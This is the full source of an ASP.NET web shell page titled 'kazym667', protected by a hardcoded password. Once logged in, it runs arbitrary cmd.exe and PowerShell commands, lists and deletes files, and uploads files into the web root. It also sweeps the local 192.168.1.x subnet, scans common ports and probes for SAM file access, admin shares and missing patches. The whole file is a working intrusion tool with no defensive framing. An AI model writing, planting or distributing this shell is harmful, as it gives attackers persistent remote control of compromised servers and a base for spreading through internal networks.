<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net.NetworkInformation" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text.RegularExpressions" %>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>kazym667</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-dark text-light">
    <div class="container py-5">
        <h1 class="text-center mb-4">kazym667</h1>
        <div class="card bg-secondary text-light">
            <div class="card-body">
                <form runat="server">
                    <asp:Panel ID="LoginPanel" runat="server">
                        <div class="mb-3">
                            <label for="PasswordTextBox" class="form-label">Enter Password:</label>
                            <asp:TextBox ID="PasswordTextBox" runat="server" TextMode="Password" CssClass="form-control" />
                        </div>
                        <asp:Button ID="LoginButton" runat="server" Text="Login" OnClick="LoginButton_Click" CssClass="btn btn-primary" />
                        <asp:Label ID="ErrorLabel" runat="server" CssClass="text-danger mt-2" />
                    </asp:Panel>
                    
                    <asp:Panel ID="ContentPanel" runat="server" Visible="false">
                        <div class="mb-3">
                            <label for="PathTextBox" class="form-label">Directory Path:</label>
                            <div class="input-group">
                                <asp:TextBox ID="PathTextBox" runat="server" CssClass="form-control" />
                                <asp:Button ID="ListButton" runat="server" Text="List Files" OnClick="ListButton_Click" CssClass="btn btn-primary" />
                            </div>
                        </div>
                        <div class="mb-3">
                            <label for="CommandTextBox" class="form-label">Command:</label>
                            <div class="input-group">
                                <asp:TextBox ID="CommandTextBox" runat="server" CssClass="form-control" />
                                <asp:DropDownList ID="CommandTypeDropDown" runat="server" CssClass="form-select" style="max-width: 150px;">
                                    <asp:ListItem Text="CMD" Value="cmd" />
                                    <asp:ListItem Text="PowerShell" Value="powershell" />
                                </asp:DropDownList>
                                <asp:Button ID="RunButton" runat="server" Text="Run Command" OnClick="RunButton_Click" CssClass="btn btn-success" />
                            </div>
                        </div>
                        <div class="mb-3">
                            <asp:Button ID="NetworkScanButton" runat="server" Text="Network Scan" OnClick="NetworkScanButton_Click" CssClass="btn btn-info" />
                            <asp:Button ID="PortScanButton" runat="server" Text="Port Scan" OnClick="PortScanButton_Click" CssClass="btn btn-warning" />
                            <asp:Button ID="VulnScanButton" runat="server" Text="Vulnerability Scan" OnClick="VulnScanButton_Click" CssClass="btn btn-danger" />
                        </div>
                        <div class="mb-3">
                            <label for="FileUpload" class="form-label">Upload File:</label>
                            <asp:FileUpload ID="FileUpload" runat="server" CssClass="form-control" />
                            <asp:Button ID="UploadButton" runat="server" Text="Upload" OnClick="UploadButton_Click" CssClass="btn btn-primary mt-2" />
                        </div>
                    </asp:Panel>
                </form>
                <div class="mt-4">
                    <asp:Literal ID="OutputLiteral" runat="server" />
                </div>
            </div>
        </div>
    </div>

    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                if (Session["Authenticated"] != null && (bool)Session["Authenticated"])
                {
                    ShowContent();
                }
                PathTextBox.Text = Server.MapPath(".");
            }
        }

        protected void LoginButton_Click(object sender, EventArgs e)
        {
            string correctPassword = "P@ssw0rd1234@"; // Change this to your desired password
            if (PasswordTextBox.Text == correctPassword)
            {
                Session["Authenticated"] = true;
                ShowContent();
            }
            else
            {
                ErrorLabel.Text = "Incorrect password. Please try again.";
            }
        }

        private void ShowContent()
        {
            LoginPanel.Visible = false;
            ContentPanel.Visible = true;
        }

        protected void ListButton_Click(object sender, EventArgs e)
{
    string path = PathTextBox.Text;
    if (Directory.Exists(path))
    {
        string[] directories = Directory.GetDirectories(path);
        string[] files = Directory.GetFiles(path);

        System.Text.StringBuilder sb = new System.Text.StringBuilder();
        sb.Append("<h4 class='mt-4 mb-3'>Directory Listing for: " + Server.HtmlEncode(path) + "</h4>");
        sb.Append("<div class='table-responsive'><table class='table table-dark table-striped table-hover'>");
        sb.Append("<thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Last Modified</th><th>Permissions</th><th>Actions</th></tr></thead><tbody>");

        foreach (string dir in directories)
        {
            DirectoryInfo dirInfo = new DirectoryInfo(dir);
            sb.Append("<tr>");
            sb.Append("<td>" + Server.HtmlEncode(dirInfo.Name) + "</td>");
            sb.Append("<td>Directory</td>");
            sb.Append("<td>-</td>");
            sb.Append("<td>" + dirInfo.LastWriteTime + "</td>");
            sb.Append("<td>" + GetFilePermissions(dir) + "</td>");
            sb.Append("<td>-</td>");
            sb.Append("</tr>");
        }

        foreach (string file in files)
        {
            FileInfo fileInfo = new FileInfo(file);
            sb.Append("<tr>");
            sb.Append("<td>" + Server.HtmlEncode(fileInfo.Name) + "</td>");
            sb.Append("<td>File</td>");
            sb.Append("<td>" + fileInfo.Length + " bytes</td>");
            sb.Append("<td>" + fileInfo.LastWriteTime + "</td>");
            sb.Append("<td>" + GetFilePermissions(file) + "</td>");
            sb.Append("<td><asp:Button ID='DeleteButton_" + fileInfo.Name + "' runat='server' Text='Delete' OnClick='DeleteButton_Click' CommandArgument='" + Server.HtmlEncode(file) + "' CssClass='btn btn-danger btn-sm' /></td>");
            sb.Append("</tr>");
        }

        sb.Append("</tbody></table></div>");
        OutputLiteral.Text = sb.ToString();
    }
    else
    {
        OutputLiteral.Text = "<div class='alert alert-danger'>Invalid directory path.</div>";
    }
}

protected string GetFilePermissions(string path)
{
    try
    {
        FileAttributes attr = File.GetAttributes(path);
        return attr.ToString();
    }
    catch
    {
        return "Unable to retrieve permissions";
    }
}

protected void RunButton_Click(object sender, EventArgs e)
{
    string command = CommandTextBox.Text;
    string commandType = CommandTypeDropDown.SelectedValue;

    if (!string.IsNullOrEmpty(command))
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            if (commandType == "cmd")
            {
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + command;
            }
            else if (commandType == "powershell")
            {
                psi.FileName = "powershell.exe";
                psi.Arguments = "-Command " + command;
            }
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                OutputLiteral.Text = "<h4 class='mt-4 mb-3'>Command Output:</h4><pre class='bg-dark text-light p-3 rounded'>" + Server.HtmlEncode(output + error) + "</pre>";
            }
        }
        catch (Exception ex)
        {
            OutputLiteral.Text = "<div class='alert alert-danger'>Error executing command: " + Server.HtmlEncode(ex.Message) + "</div>";
        }
    }
    else
    {
        OutputLiteral.Text = "<div class='alert alert-warning'>Please enter a command.</div>";
    }
}

protected void NetworkScanButton_Click(object sender, EventArgs e)
{
    System.Text.StringBuilder sb = new System.Text.StringBuilder();
    sb.Append("<h4 class='mt-4 mb-3'>Network Scan Results:</h4>");
    sb.Append("<div class='table-responsive'><table class='table table-dark table-striped table-hover'>");
    sb.Append("<thead><tr><th>IP Address</th><th>Status</th><th>Hostname</th></tr></thead><tbody>");

    for (int i = 1; i <= 254; i++)
    {
        string ip = "192.168.1." + i;
        Ping pingSender = new Ping();
        PingReply reply = pingSender.Send(ip, 1000);
        
        sb.Append("<tr>");
        sb.Append("<td>" + ip + "</td>");
        sb.Append("<td>" + reply.Status + "</td>");
        
        try
        {
            IPHostEntry hostEntry = System.Net.Dns.GetHostEntry(ip);
            sb.Append("<td>" + hostEntry.HostName + "</td>");
        }
        catch
        {
            sb.Append("<td>Unable to resolve hostname</td>");
        }
        
        sb.Append("</tr>");
    }

    sb.Append("</tbody></table></div>");
    OutputLiteral.Text = sb.ToString();
}

protected void PortScanButton_Click(object sender, EventArgs e)
{
    string ip = "127.0.0.1"; // Change this to the target IP
    System.Text.StringBuilder sb = new System.Text.StringBuilder();
    sb.Append("<h4 class='mt-4 mb-3'>Port Scan Results for " + ip + ":</h4>");
    sb.Append("<div class='table-responsive'><table class='table table-dark table-striped table-hover'>");
    sb.Append("<thead><tr><th>Port</th><th>Status</th></tr></thead><tbody>");

    int[] commonPorts = { 21, 22, 23, 25, 53, 80, 110, 143, 443, 3389 };
    foreach (int port in commonPorts)
    {
        using (TcpClient tcpClient = new TcpClient())
        {
            try
            {
                tcpClient.Connect(ip, port);
                sb.Append("<tr><td>" + port + "</td><td>Open</td></tr>");
            }
            catch
            {
                sb.Append("<tr><td>" + port + "</td><td>Closed</td></tr>");
            }
        }
    }

    sb.Append("</tbody></table></div>");
    OutputLiteral.Text = sb.ToString();
}

protected void VulnScanButton_Click(object sender, EventArgs e)
{
    System.Text.StringBuilder sb = new System.Text.StringBuilder();
    sb.Append("<h4 class='mt-4 mb-3'>Basic Vulnerability Scan Results:</h4>");
    sb.Append("<ul class='list-group'>");

    sb.Append("<li class='list-group-item bg-dark text-light'>Checking for weak passwords... ");
    if (File.Exists("C:\\windows\\system32\\config\\SAM"))
    {
        sb.Append("SAM file accessible. Potential vulnerability.</li>");
    }
    else
    {
        sb.Append("SAM file not accessible.</li>");
    }

    sb.Append("<li class='list-group-item bg-dark text-light'>Checking for open shares... ");
    Process p = new Process();
    p.StartInfo.FileName = "net.exe";
    p.StartInfo.Arguments = "share";
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    p.WaitForExit();
    if (output.Contains("ADMIN$") || output.Contains("C$"))
    {
        sb.Append("Administrative shares detected.</li>");
    }
    else
    {
        sb.Append("No administrative shares detected.</li>");
    }

    sb.Append("<li class='list-group-item bg-dark text-light'>Checking for unpatched vulnerabilities... ");
    p = new Process();
    p.StartInfo.FileName = "wmic.exe";
    p.StartInfo.Arguments = "qfe list brief";
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    output = p.StandardOutput.ReadToEnd();
    p.WaitForExit();
    if (!output.Contains(DateTime.Now.AddDays(-30).ToString("yyyyMMdd")))
    {
        sb.Append("System may be missing recent patches.</li>");
    }
    else
    {
        sb.Append("System appears to be up to date.</li>");
    }

    sb.Append("</ul>");
    OutputLiteral.Text = sb.ToString();
}

protected void UploadButton_Click(object sender, EventArgs e)
{
    if (FileUpload.HasFile)
    {
        try
        {
            string filename = Path.GetFileName(FileUpload.FileName);
            string uploadPath = Path.Combine(Server.MapPath("."), filename);
            FileUpload.SaveAs(uploadPath);
            OutputLiteral.Text = "<div class='alert alert-success'>File uploaded successfully: " + Server.HtmlEncode(filename) + "</div>";
        }
        catch (Exception ex)
        {
            OutputLiteral.Text = "<div class='alert alert-danger'>Error uploading file: " + Server.HtmlEncode(ex.Message) + "</div>";
        }
    }
    else
    {
        OutputLiteral.Text = "<div class='alert alert-warning'>Please select a file to upload.</div>";
    }
}

protected void DeleteButton_Click(object sender, EventArgs e)
{
    Button btn = (Button)sender;
    string filePath = btn.CommandArgument;
    try
    {
        File.Delete(filePath);
        OutputLiteral.Text = "<div class='alert alert-success'>File deleted successfully: " + Server.HtmlEncode(Path.GetFileName(filePath)) + "</div>";
        ListButton_Click(null, null); // Refresh the file list
    }
    catch (Exception ex)
    {
        OutputLiteral.Text = "<div class='alert alert-danger'>Error deleting file: " + Server.HtmlEncode(ex.Message) + "</div>";
    }
}


    </script>
</body>
</html>
